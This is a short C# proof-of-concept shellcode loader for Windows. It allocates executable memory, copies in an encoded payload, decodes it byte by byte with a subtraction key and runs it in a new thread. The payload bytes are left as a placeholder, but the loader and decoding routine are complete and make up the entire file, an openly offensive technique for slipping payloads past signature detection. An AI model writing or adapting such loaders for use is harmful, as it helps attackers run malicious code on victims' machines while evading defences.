using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

// Yes the code is shit, but meh so what - not like I have the whole day to write good pocs
namespace ConsoleApp1 {
	
	class Program{
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();
		
		static void Main(string[] args)
		{
			byte[] buf = new byte[] { /* shellcode */ };
			
			int size = buf.Length;
			
			IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40); 
			
			Marshal.Copy(buf, 0, addr, size);
			
			buf = new byte[0];
			
			int key = 666; // key used to encode the shellcode
			
			IntPtr ptr;
			byte[] baite = new byte[1] { 0x90 };
			for (int i = 0; i < size; i++)
			{
				ptr = IntPtr.Add(addr, i);
				Marshal.Copy(ptr, baite, 0, 1);
				baite[0] = (byte)(((uint)baite[0] - key) & 0xFF);
				Marshal.Copy(baite, 0, ptr, 1);
			}
			
			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
			
			WaitForSingleObject(hThread, 0xFFFFFFFF);
		}
	}
}